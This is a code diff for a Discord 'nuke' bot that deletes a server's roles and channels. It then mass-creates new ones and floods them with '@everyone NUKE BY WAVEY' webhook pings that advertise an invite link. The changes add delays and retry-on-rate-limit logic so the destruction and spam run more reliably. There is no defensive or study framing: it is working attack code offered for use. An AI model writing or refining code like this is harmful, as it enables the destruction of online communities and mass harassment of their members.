@@ -12,6 +12,9 @@ const client = new Client({
 const emojis = ['💀', '⚰️', '🦴', '🪦', '⚔️', '🗡️', '🔪', '🩸', '☠️', '👻'];
 const discordLink = "https://discord.gg/XrTZWKgXca";
 
+// Delay function to avoid rate limits
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}`);
     
@@ -93,9 +96,9 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
             }
         }));
         
-        // Create 15 roles
+        // Create 10 roles (reduced from 15)
         const rolePromises = [];
-        for (let i = 0; i < 15; i++) {
+        for (let i = 0; i < 10; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
             rolePromises.push(
                 guild.roles.create({
@@ -108,9 +111,9 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
         }
         await Promise.all(rolePromises);
         
-        // Create 35 text channels and send webhook pings - FIXED TO PROPERLY AWAIT
+        // Create 20 text channels (reduced from 55) with rate limit handling
         const channelPromises = [];
-        for (let i = 0; i < 35; i++) {
+        for (let i = 0; i < 20; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
             
             channelPromises.push(
@@ -130,20 +133,37 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
                         
                         const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
                         
-                        // Send 25 pings through the webhook - AWAIT EACH ONE
+                        // Send 25 pings with delays to avoid rate limits
                         for (let j = 0; j < 25; j++) {
-                            await webhookClient.send(`@everyone NUKE BY WAVEY ${discordLink}`).catch(console.error);
+                            try {
+                                await webhookClient.send(`@everyone NUKE BY WAVEY ${discordLink}`);
+                                // Small delay between pings (350ms)
+                                await delay(350);
+                            } catch (error) {
+                                // If rate limited, wait and retry
+                                if (error.code === 429) {
+                                    const retryAfter = error.retryAfter || 5000;
+                                    console.log(`Rate limited, waiting ${retryAfter}ms...`);
+                                    await delay(retryAfter);
+                                    j--; // Retry this ping
+                                } else {
+                                    console.error('Webhook send error:', error);
+                                }
+                            }
                         }
                         
                         // Delete the webhook
                         await webhook.delete().catch(console.error);
                         
-                        console.log(`Completed channel ${i + 1}/55`);
+                        console.log(`Completed channel ${i + 1}/20`);
                     } catch (error) {
                         console.error('Error in channel/webhook:', error);
                     }
                 })()
             );
+            
+            // Delay between channel creations to avoid rate limits
+            await delay(500);
         }
         
         // Wait for ALL channels AND their webhook pings to complete
@@ -163,8 +183,8 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
                     { name: '👥 Members', value: memberCount.toString(), inline: true },
                     { name: '🗑️ Roles Deleted', value: rolesDeleted.toString(), inline: true },
                     { name: '📋 Channels Deleted', value: channelsDeleted.toString(), inline: true },
-                    { name: '➕ Roles Created', value: '15', inline: true },
-                    { name: '➕ Channels Created', value: '35', inline: true }
+                    { name: '➕ Roles Created', value: '10', inline: true },
+                    { name: '➕ Channels Created', value: '20', inline: true }
                 )
                 .setTimestamp()
                 .setFooter({ text: 'Wavey Nuke Bot' });
